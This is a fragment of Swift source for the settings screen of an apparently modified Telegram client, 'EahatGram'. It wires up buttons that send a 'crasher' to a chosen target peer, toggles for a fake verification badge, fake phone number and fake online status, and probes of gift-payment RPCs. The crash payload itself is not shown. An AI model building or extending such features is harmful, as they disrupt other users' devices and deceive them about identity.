                return false
            }
        case let .translateMyMessagesLanguage(lhsText):
            if case let .translateMyMessagesLanguage(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .aiAssistantEnabled(lhsValue):
            if case let .aiAssistantEnabled(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .aiAssistantPeer(lhsText):
            if case let .aiAssistantPeer(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .aiAssistantTargetPeer(lhsValue):
            if case let .aiAssistantTargetPeer(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .aiAssistantTargetPeerId(lhsText):
            if case let .aiAssistantTargetPeerId(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .aiAssistantStatus(lhsText):
            if case let .aiAssistantStatus(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .downFolder(lhsValue):
            if case let .downFolder(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case .customUiTheme:
            if case .customUiTheme = rhs {
                return true
            } else {
                return false
            }
        case let .viewUnread2Read(lhsValue):
            if case let .viewUnread2Read(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .farmBotUsername(lhsText):
            if case let .farmBotUsername(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .farmCommand(lhsText):
            if case let .farmCommand(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .farmInterval(lhsText):
            if case let .farmInterval(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .farmBackground(lhsValue):
            if case let .farmBackground(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case .addFarmJob:
            if case .addFarmJob = rhs {
                return true
            } else {
                return false
            }
        case let .farmJobEnabled(lhsIndex, lhsText, lhsValue):
            if case let .farmJobEnabled(rhsIndex, rhsText, rhsValue) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText && lhsValue == rhsValue
            } else {
                return false
            }
        case let .farmJobInfo(lhsIndex, lhsText):
            if case let .farmJobInfo(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .removeFarmJob(lhsIndex, lhsText):
            if case let .removeFarmJob(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .voiceMod(lhsValue):
            if case let .voiceMod(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .voiceModPreset(lhsText):
            if case let .voiceModPreset(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .voiceModV2(lhsValue):
            if case let .voiceModV2(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .voiceModV2Voice(lhsText):
            if case let .voiceModV2Voice(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .useDirectRpc(lhsValue):
            if case let .useDirectRpc(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .chainPeerId(lhsText):
            if case let .chainPeerId(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .chainDepth(lhsText):
            if case let .chainDepth(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .chainPeerLimit(lhsText):
            if case let .chainPeerLimit(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .chainWorkerCount(lhsText):
            if case let .chainWorkerCount(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case .openCurrentChainVisualization:
            if case .openCurrentChainVisualization = rhs {
                return true
            } else {
                return false
            }
        case .runChainScan:
            if case .runChainScan = rhs {
                return true
            } else {
                return false
            }
        case let .chainStatus(lhsText):
            if case let .chainStatus(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .functestInfo(lhsText):
            if case let .functestInfo(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .functestToggle(lhsIndex, lhsText, lhsValue):
            if case let .functestToggle(rhsIndex, rhsText, rhsValue) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText && lhsValue == rhsValue
            } else {
                return false
            }
        case .refreshResponses:
            if case .refreshResponses = rhs {
                return true
            } else {
                return false
            }
        case let .noGifts(lhsText):
            if case let .noGifts(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .giftsSummary(lhsText):
            if case let .giftsSummary(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .meGift(lhsIndex, lhsText):
            if case let .meGift(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .meGiftInfo(lhsIndex, lhsText):
            if case let .meGiftInfo(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .testGift(lhsIndex, lhsText):
            if case let .testGift(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .testGiftInfo(lhsIndex, lhsText):
            if case let .testGiftInfo(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .noResponses(lhsText):
            if case let .noResponses(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .response(lhsIndex, lhsText):
            if case let .response(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .otherMethod(lhsIndex, lhsText):
            if case let .otherMethod(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        case let .otherMethodInfo(lhsIndex, lhsText):
            if case let .otherMethodInfo(rhsIndex, rhsText) = rhs {
                return lhsIndex == rhsIndex && lhsText == rhsText
            } else {
                return false
            }
        }
    }

    static func <(lhs: EahatGramEntry, rhs: EahatGramEntry) -> Bool {
        if lhs.section != rhs.section {
            return lhs.section < rhs.section
        }
        return lhs.stableId < rhs.stableId
    }

    func item(presentationData: ItemListPresentationData, arguments: Any) -> ListViewItem {
        let arguments = arguments as! EahatGramArguments
        switch self {
        case let .selectPeer(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Target Peer",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectPeer()
                }
            )
        case .crasher:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Crash (enqueue)",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.sendCrasher()
                }
            )
        case .crasherDirect:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Crash (direct API)",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.sendCrasherDirect()
                }
            )
        case .addGiftToProfile:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Add Gift To Profile",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.addGiftToProfile()
                }
            )
        case .clearGifts:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Clear Gift",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.clearGifts()
                }
            )
        case .removeAllContacts:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Remove Contacts Button",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.removeAllContacts()
                }
            )
        case .removeAllCalls:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Remove Calls Button",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.removeAllCalls()
                }
            )
        case let .nftUsernameTag(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "NFT"),
                text: text,
                placeholder: "@nfttag",
                type: .username,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateNftUsernameTag(value)
                },
                action: {}
            )
        case let .nftUsernamePrice(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "NFT Price"),
                text: text,
                placeholder: "1200 TON",
                type: .regular(capitalization: false, autocorrection: false),
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateNftUsernamePrice(value)
                },
                action: {}
            )
        case .addNftUsernameTag:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Add NFT Tag",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.addNftUsernameTag()
                }
            )
        case let .fakePhoneNumber(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Fake Number"),
                text: text,
                placeholder: "79991234567",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateFakePhoneNumber(value)
                },
                action: {}
            )
        case let .fakeRate(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Fake Rate",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateFakeRateEnabled(value)
                }
            )
        case let .fakeRateLevel(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Rate Level"),
                text: text,
                placeholder: "87",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateFakeRateLevel(value)
                },
                action: {}
            )
        case let .fakeVerify(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Fake Verify",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateFakeVerifyEnabled(value)
                }
            )
        case let .wallpaperInfo(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case .openWallpaperPicker:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Choose Wallpaper From Gallery",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.openWallpaperPicker()
                }
            )
        case .addCustomGiftToProfile:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Custom Gift",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.addCustomGiftToProfile()
                }
            )
        case let .starsAmount(value):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Stars"),
                text: "\(value)",
                placeholder: "100",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    let normalized = eahatGramNormalizedNumericText(value, maxLength: 6)
                    if let parsed = Int32(normalized), parsed > 0 {
                        arguments.updateStarsAmount(parsed)
                    }
                },
                action: {}
            )
        case .addStars:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Add Stars",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.addStars()
                }
            )
        case let .starsStatus(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .targetHud(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "TargetHUD",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateTargetHudEnabled(value)
                }
            )
        case let .liquidGlass(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Liquid Glass",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateLiquidGlassEnabled(value)
                }
            )
        case let .replyQuote(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Reply Quote",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateReplyQuoteEnabled(value)
                }
            )
        case let .ghostMode(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Ghost Mode",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateGhostModeEnabled(value)
                }
            )
        case let .fakeOnline(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Fake Online",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateFakeOnlineEnabled(value)
                }
            )
        case let .fakeOnlineBackground(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Fake Online Background",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateFakeOnlineBackgroundEnabled(value)
                }
            )
        case let .saveDeletedMessages(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Save Delete Messages",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateSaveDeletedMessagesEnabled(value)
                }
            )
        case let .saveEditedMessages(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Save Edit Messages",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateSaveEditedMessagesEnabled(value)
                }
            )
        case let .noLags(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "No Lags",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateNoLagsEnabled(value)
                }
            )
        case let .bogatiUi(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Bogati UI",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateBogatiUiEnabled(value)
                }
            )
        case let .noWarning(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "No Warning",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateHideFailedWarningEnabled(value)
                }
            )
        case let .sendMode(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Send Mode",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateSendModeEnabled(value)
                }
            )
        case let .translator(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Translator",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateTranslatorEnabled(value)
                }
            )
        case let .translatorLanguage(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Translator Language",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectTranslatorLanguage()
                }
            )
        case let .translateMyMessages(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Translate My Messages",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateTranslateMyMessagesEnabled(value)
                }
            )
        case let .translateMyMessagesLanguage(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "My Messages Language",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectTranslateMyMessagesLanguage()
                }
            )
        case let .aiAssistantEnabled(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "AI Auto Reply",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateAiAssistantEnabled(value)
                }
            )
        case let .aiAssistantPeer(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "AI Chat",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectAiAssistantPeer()
                }
            )
        case let .aiAssistantTargetPeer(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Target Peer",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateAiAssistantTargetPeerEnabled(value)
                }
            )
        case let .aiAssistantTargetPeerId(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Target Peer ID"),
                text: text,
                placeholder: "User peer id",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateAiAssistantTargetPeerId(value)
                },
                action: {}
            )
        case let .aiAssistantStatus(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .downFolder(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Down Folder",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateDownFolderEnabled(value)
                }
            )
        case .customUiTheme:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Custom UI Theme",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.openCustomUiTheme()
                }
            )
        case let .viewUnread2Read(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "View Unread2Read",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateViewUnread2ReadEnabled(value)
                }
            )
        case let .farmBotUsername(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Bot Username"),
                text: text,
                placeholder: "botfather",
                type: .username,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateFarmBotUsername(value)
                },
                action: {}
            )
        case let .farmCommand(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Command"),
                text: text,
                placeholder: "/farm",
                type: .regular(capitalization: false, autocorrection: false),
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateFarmCommand(value)
                },
                action: {}
            )
        case let .farmInterval(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Minutes"),
                text: text,
                placeholder: "240",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateFarmInterval(value)
                },
                action: {}
            )
        case let .farmBackground(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Farm Background",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateFarmBackgroundEnabled(value)
                }
            )
        case .addFarmJob:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Add Farm Bot",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.addFarmJob()
                }
            )
        case let .farmJobEnabled(index, title, value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: title,
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { updatedValue in
                    arguments.updateFarmJobEnabled(index, updatedValue)
                }
            )
        case let .farmJobInfo(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .removeFarmJob(index, title):
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: title,
                kind: .destructive,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.removeFarmJob(index)
                }
            )
        case let .voiceMod(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Clownfish",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateVoiceModEnabled(value)
                }
            )
        case let .voiceModPreset(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Voice",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectVoiceModPreset()
                }
            )
        case let .voiceModV2(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Mode V2",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateVoiceModV2Enabled(value)
                }
            )
        case let .voiceModV2Voice(text):
            return ItemListDisclosureItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Synthetic Voice",
                label: text,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.selectVoiceModV2Voice()
                }
            )
        case let .useDirectRpc(value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Raw Direct payments.transferStarGift",
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { value in
                    arguments.updateUseDirectRpc(value)
                }
            )
        case let .chainPeerId(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Peer Id"),
                text: text,
                placeholder: "7582246143",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateChainPeerId(value)
                },
                action: {}
            )
        case let .chainDepth(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Chains"),
                text: text,
                placeholder: "5",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateChainDepth(value)
                },
                action: {}
            )
        case let .chainPeerLimit(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Limit"),
                text: text,
                placeholder: "5",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateChainPeerLimit(value)
                },
                action: {
                    arguments.runChainScan()
                }
            )
        case let .chainWorkerCount(text):
            return ItemListSingleLineInputItem(
                context: arguments.context,
                presentationData: presentationData,
                systemStyle: .glass,
                title: eahatGramInputTitle(presentationData, "Workers"),
                text: text,
                placeholder: "4",
                type: .number,
                sectionId: self.section,
                textUpdated: { value in
                    arguments.updateChainWorkerCount(value)
                },
                action: {
                    arguments.runChainScan()
                }
            )
        case .openCurrentChainVisualization:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Open Current Visualization",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.openCurrentChainVisualization()
                }
            )
        case .runChainScan:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Build Gift Chain",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.runChainScan()
                }
            )
        case let .chainStatus(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .functestInfo(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .functestToggle(index, text, value):
            return ItemListSwitchItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: text,
                value: value,
                sectionId: self.section,
                style: .blocks,
                updated: { updatedValue in
                    arguments.updateFunctestToggle(index, updatedValue)
                }
            )
        case .refreshResponses:
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: "Refresh Server Responses",
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.refreshResponses()
                }
            )
        case let .noGifts(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .giftsSummary(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .meGift(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .meGiftInfo(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .testGift(index, text):
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: text,
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.runGiftProbe(index)
                }
            )
        case let .testGiftInfo(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .noResponses(text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .response(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        case let .otherMethod(index, text):
            return ItemListActionItem(
                presentationData: presentationData,
                systemStyle: .glass,
                title: text,
                kind: .generic,
                alignment: .natural,
                sectionId: self.section,
                style: .blocks,
                action: {
                    arguments.showOtherMethod(index)
                }
            )
        case let .otherMethodInfo(_, text):
            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
        }
    }
}

private func eahatGramGiftTitle(_ gift: ProfileGiftsContext.State.StarGift) -> String {
    switch gift.gift {
    case let .generic(genericGift):
        if let title = genericGift.title, !title.isEmpty {
            return title
        } else {
            return "Gift \(genericGift.id)"
        }
    case let .unique(uniqueGift):
        return "\(uniqueGift.title) #\(uniqueGift.number)"
    }
}

private func eahatGramGiftInfo(_ gift: ProfileGiftsContext.State.StarGift) -> String {
    let hostInfo: String
    let slugInfo: String
    switch gift.gift {
    case .generic:
        hostInfo = "hostPeerId=nil"
        slugInfo = "slug=nil"
    case let .unique(uniqueGift):
        hostInfo = "hostPeerId=\(String(describing: uniqueGift.hostPeerId))"
        slugInfo = "slug=\(uniqueGift.slug)"
    }
    return "reference=\(String(describing: gift.reference)) transferStars=\(String(describing: gift.transferStars)) canTransferDate=\(String(describing: gift.canTransferDate)) \(hostInfo) \(slugInfo)"
}

private func eahatGramOtherMethods() -> [(title: String, info: String)] {
    return [
        (
            title: "sendBotPaymentForm",
            info: "BotPaymentForm.swift:724-757 builds invoice/credentials/flags and calls payments.sendPaymentForm; 760-762 applies paymentResultData.updates; 819-822 returns done or externalVerificationRequired."
        ),
        (
            title: "sendAppStoreReceipt",
            info: "AppStore.swift:12-22 defines purpose; 168 builds InputStorePaymentPurpose; 171 calls payments.assignAppStoreTransaction; 179-180 applies updates."
        ),
        (
            title: "applyPremiumGiftCode",
            info: "GiftCodes.swift:295 calls payments.applyGiftCode; 297-300 maps PREMIUM_SUB_ACTIVE_UNTIL_*; 306-307 applies updates."
        ),
        (
            title: "launchPrepaidGiveaway",
            info: "GiftCodes.swift:322-347 builds flags and peers; 352-357 chooses inputStorePaymentStarsGiveaway or inputStorePaymentPremiumGiveaway; 360 calls payments.launchPrepaidGiveaway; 364-365 applies updates."
        ),
        (
            title: "sendStarsPaymentForm",
            info: "Stars.swift:1603-1615 builds invoice and calls payments.sendStarsForm; 1622-1624 applies paymentResultData.updates; 1635-1713 resolves receiptMessageId and uniqueStarGift."
        ),
        (
            title: "resolveStarGiftOffer",
            info: "StarGiftsOffers.swift:12-15 sets reject flag when accept=false; 16 calls payments.resolveStarGiftOffer; 20-21 applies updates."
        ),
        (
            title: "sendStarGiftOffer",
            info: "StarGiftsOffers.swift:33-35 sets allowPaidStars flag; 37-45 resolves peer and calls payments.sendStarGiftOffer; 49-50 applies updates."
        )
    ]
}

private func eahatGramFarmJobInfo(_ job: EahatGramFarmJob) -> String {
    let lastTriggeredAt = job.lastTriggeredAt ?? 0
    let lastResultText = job.lastResultText ?? "status=nil"
    return "command=\(job.command) interval=\(job.intervalMinutes)m lastTriggeredAt=\(lastTriggeredAt) \(lastResultText)"
}

private enum EahatGramFunctestToggle: Int, CaseIterable {
    case skipReadHistory
    case alwaysDisplayTyping
    case enablePWA
    case disableImageContentAnalysis
    case storiesJpegExperiment
    case disableCallV2
    case enableVoipTcp
    case playerV2
    case disableLanguageRecognition
    case disableReloginTokens

    var title: String {
        switch self {
        case .skipReadHistory:
            return "Skip Read History"
        case .alwaysDisplayTyping:
            return "Always Display Typing"
        case .enablePWA:
            return "Enable PWA Browser"
        case .disableImageContentAnalysis:
            return "Disable Image Content Analysis"
        case .storiesJpegExperiment:
            return "Stories JPEG Experiment"
        case .disableCallV2:
            return "Disable Call V2"
        case .enableVoipTcp:
            return "Enable VoIP TCP"
        case .playerV2:
            return "Use Player V2"
        case .disableLanguageRecognition:
            return "Disable Language Recognition"
        case .disableReloginTokens:
            return "Disable Relogin Tokens"
        }
    }

    var responseKey: String {
        switch self {
        case .skipReadHistory:
            return "skipReadHistory"
        case .alwaysDisplayTyping:
            return "alwaysDisplayTyping"
        case .enablePWA:
            return "enablePWA"
        case .disableImageContentAnalysis:
            return "disableImageContentAnalysis"
        case .storiesJpegExperiment:
            return "storiesJpegExperiment"
        case .disableCallV2:
            return "disableCallV2"
        case .enableVoipTcp:
            return "enableVoipTcp"
        case .playerV2:
            return "playerV2"
        case .disableLanguageRecognition:
            return "disableLanguageRecognition"
        case .disableReloginTokens:
            return "disableReloginTokens"
        }
    }

    func value(state: EahatGramState) -> Bool {
        switch self {
        case .skipReadHistory:
            return state.functestSkipReadHistoryEnabled
        case .alwaysDisplayTyping:
            return state.functestAlwaysDisplayTypingEnabled
        case .enablePWA:
            return state.functestEnablePWAEnabled
        case .disableImageContentAnalysis:
            return state.functestDisableImageContentAnalysisEnabled
        case .storiesJpegExperiment:
            return state.functestStoriesJpegExperimentEnabled
        case .disableCallV2:
            return state.functestDisableCallV2Enabled
        case .enableVoipTcp:
            return state.functestEnableVoipTcpEnabled
        case .playerV2:
            return state.functestPlayerV2Enabled
